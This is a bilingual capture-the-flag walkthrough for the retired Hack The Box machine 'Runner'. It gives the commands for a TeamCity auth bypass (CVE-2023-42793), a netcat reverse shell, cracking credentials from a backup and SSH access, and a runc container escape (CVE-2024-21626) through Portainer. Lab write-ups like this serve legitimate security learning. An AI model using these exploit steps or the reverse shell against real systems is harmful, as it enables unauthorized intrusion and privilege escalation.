# Runner [Medium]

> **ES:** Máquina Linux media con TeamCity vulnerable (bypass + RCE), backup con credenciales/clave SSH y root vía Portainer + runc.
> **EN:** Medium Linux machine with vulnerable TeamCity (bypass + RCE), backup with credentials/SSH key, and root via Portainer + runc.

| Campo | Valor |
|-------|-------|
| **Dificultad** | Medium |
| **OS** | Linux |
| **Estado** | Retired |
| **Maker** | TheCyberGeek |
| **URL** | https://app.hackthebox.com/machines/Runner |
| **IP lab** | 10.10.11.13 |
| **Fecha de resolución** | 2026-09-24 |

---

## Fuentes / Sources

- [IppSec: Runner (video)](https://youtube.com/watch?v=5G0sCI3DUtE) - IppSec - fecha de acceso: 2026-09-24.

## 🎯 Objetivo / Goal

> **ES:** Conseguir `user.txt` y `root.txt` vía TeamCity CVE-2023-42793, backup HSQLDB → SSH como `john`, y Portainer + CVE-2024-21626 (runc).
> **EN:** Get `user.txt` and `root.txt` via TeamCity CVE-2023-42793, HSQLDB backup → SSH as `john`, and Portainer + CVE-2024-21626 (runc).

---

## 🛠️ Herramientas usadas / Tools used

- [ ] nmap
- [ ] gobuster vhost / ffuf (subdominio `teamcity`)
- [ ] exploit CVE-2023-42793 (Exploit-DB 51884 / script Python)
- [ ] curl (API REST de TeamCity: tokens, debug, backup)
- [ ] ssh + hashcat (clave/hash de `matthew`/`john`)
- [ ] Portainer (build de imagen) + PoC CVE-2024-21626

---

## 📋 Pasos / Steps

### Paso 1 — Reconocimiento / Recon

> **ES:** Escaneo de puertos y registro de `runner.htb` en `/etc/hosts`.
> **EN:** Port scan and registering `runner.htb` in `/etc/hosts`.

```bash
nmap -A --min-rate=5000 -T5 -p- 10.10.11.13
echo "10.10.11.13 runner.htb" | sudo tee -a /etc/hosts
```

**Resultado / Result:** 22/tcp OpenSSH 8.9p1, 80/tcp nginx 1.18.0 (→ `runner.htb`), 8000/tcp (Portainer).

---

### Paso 2 — Enumeración / Enumeration

> **ES:** Fuzzing de vhosts revela `teamcity.runner.htb` (TeamCity 2023.05.3) y `portainer-administration.runner.htb`.
> **EN:** Vhost fuzzing reveals `teamcity.runner.htb` (TeamCity 2023.05.3) and `portainer-administration.runner.htb`.

```bash
gobuster vhost --append-domain -w bitquark-subdomains-top100000.txt -u http://runner.htb
echo "10.10.11.13 teamcity.runner.htb portainer-administration.runner.htb" | sudo tee -a /etc/hosts
curl -sk http://teamcity.runner.htb/login.html | grep -io "2023\.05\.3"
```

**Resultado / Result:** TeamCity 2023.05.3 → CVE-2023-42793 (auth bypass → RCE/admin).

---

### Paso 3 — Acceso inicial (foothold) / Initial access

> **ES:** Bypass que crea admin / token API, se activa `rest.debug.processes.enable` y se ejecuta comando para shell en el contenedor (`tcuser`).
> **EN:** Bypass to create admin / API token, enable `rest.debug.processes.enable`, and run a command for a container shell (`tcuser`).

```bash
python3 51884.py -u http://teamcity.runner.htb -v
TOKEN="<token-devuelto>"
curl -XPOST "http://teamcity.runner.htb//admin/dataDir.html?action=edit&fileName=config/internal.properties&content=rest.debug.processes.enable=true" -H "Authorization: Bearer $TOKEN"
curl -X POST "http://teamcity.runner.htb/app/rest/users/id:1/tokens/RPC2" -H "Authorization: Bearer $TOKEN"
# endpoint debug/processes -> nc <tu-ip> 4444 -e bash
```

**Resultado / Result:** Shell como `tcuser` en el contenedor TeamCity.

---

### Paso 4 — Usuario (user.txt) / User

> **ES:** Desde el contenedor se comprime/descarga el backup (HSQLDB), se extraen credenciales de `matthew` y clave SSH de `john` para entrar al host.
> **EN:** From the container compress/download the backup (HSQLDB), extract `matthew` credentials and `john`'s SSH key to enter the host.

```bash
# vía UI/API TeamCity: Administration -> Backup -> descargar backup
# extraer users/hsql: creds matthew + id_rsa de john (crackear passphrase si aplica)
hashcat -m <modo> hash.txt rockyou.txt
ssh -i id_rsa john@10.10.11.13
cat ~/user.txt  # formato parcial ofuscado
```

**Resultado / Result:** SSH como `john` + `user.txt` (sin pegar flag completa; nota local breve completada con fuentes externas).

---

### Paso 5 — Root (root.txt) / Privilege escalation

> **ES:** Con credenciales en Portainer se abusa el build de imágenes y runc vulnerable (CVE-2024-21626) para escribir un bash SUID / escapar al host.
> **EN:** With Portainer credentials abuse image builds and vulnerable runc (CVE-2024-21626) to drop a SUID bash / escape to the host.

```bash
runc --version  # versión vulnerable en el host
# Portainer -> Images -> Build (WORKDIR /proc/self/fd/7/ ...) -> SUID bash en el host
/host/path/bash -p
cat /root/root.txt  # formato parcial ofuscado
```

**Resultado / Result:** Técnica: escape de contenedor runc CVE-2024-21626 vía Portainer (alternativa: montar el FS del host como volumen).

---

## 🧠 Lo aprendido / Learned

> **ES:** Cadena TeamCity → backup → SSH y escapes de contenedor vía plataforma de orquestación.
> **EN:** TeamCity → backup → SSH chain and container escapes via an orchestration platform.

- [ ] Auth-bypass en TeamCity CVE-2023-42793 + debug API para RCE
- [ ] Reutilización de backups (HSQLDB) y runc CVE-2024-21626 vía Portainer

---

## 📚 Fuentes y Referencias / Sources

- **Fuente:** Nota local `Soluciones/Machines/unclasified/Runner/index.md` (nota breve: nmap 22/80/8000) — randark/nota migrada
- **Walkthrough de referencia:** Runner (Medium) | Hack The Box — https://www.hackthebox.com/machines/runner — HackTheBox (maker: TheCyberGeek)
- **Walkthrough de referencia:** HTB: Runner | 0xdf hacks stuff — https://0xdf.gitlab.io/2024/08/24/htb-runner.html — 0xdf
- **Fecha de acceso:** 2026-09-24
- **Autor de este walkthrough:** Apuromafo (contenido propio salvo cita; migración y normalización de la nota local, paráfrasis sin copiar literal ni publicar flags completas)

---

## ⚠️ Aviso Legal / Disclaimer

> **ES:** Uso educativo y personal únicamente. No afiliado a HackTheBox. No publicar flags de máquinas activas.
> **EN:** Educational and personal use only. Not affiliated with HackTheBox. Do not publish flags of active machines.

_Fecha de edición: 2026-09-24_
